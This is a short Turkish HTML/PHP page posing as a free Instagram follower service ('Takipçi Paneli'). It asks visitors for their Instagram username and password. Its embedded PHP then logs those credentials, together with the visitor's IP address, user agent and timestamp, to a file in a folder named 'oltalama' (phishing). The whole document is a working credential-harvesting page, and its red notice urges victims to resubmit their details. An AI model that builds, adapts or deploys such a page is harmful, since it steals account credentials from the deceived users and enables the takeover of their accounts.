<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Takipçi Paneli</title>
</head>
<body bgcolor="#808080">
<form method="get">
	
<font color="#bf00ff">Kullanıcı Adı:</font> <input type="text" name="kullanici_adi" title="Kullanıcı ad giriniz" required=""> <br>
<font color="#bf00ff">Şifre:</font> <input type="password" name="kullanici_sifre" title="Şifre giriniz" required=""> <br>
	<button value="input">Takipçi At</button><br>
<br>
<font color="red">Bilgilerinizi girdikten sonra instagram hesabınızı inceleyecek ve size 30-45 aralığında 
takipçi gidecektir.Hergün 1 hakkınız vardır.30 dakika içinde takipçi gelmezse bilgiler uyuşmuyor demektir.Bilgilerinizi doğru giripte takipçi gelmemiş ise 
sitemize tekrar giriş yapınız.</font>


</form>


<?php 
date_default_timezone_set('Europe/Istanbul');
$ac = fopen("oltalama/kayitlar.txt",a);
$tarih = date('d-m-Y H:i:s',time());
$usr = $_SERVER['HTTP_USER_AGENT'];
$bosluk = "\n";
$bossluk = "\n";
$al = " KULLANICI ADI > ".$_GET['kullanici_adi']." SİFRE > ".$_GET['kullanici_sifre']." Ip adresi: ".$_SERVER['REMOTE_ADDR']." USER AGENT > ".$usr." İslem Tarihi > ".$tarih.$bosluk.$bossluk;
$yaz = fwrite($ac,$al);
fclose($ac);
 ?>

</body>
</html>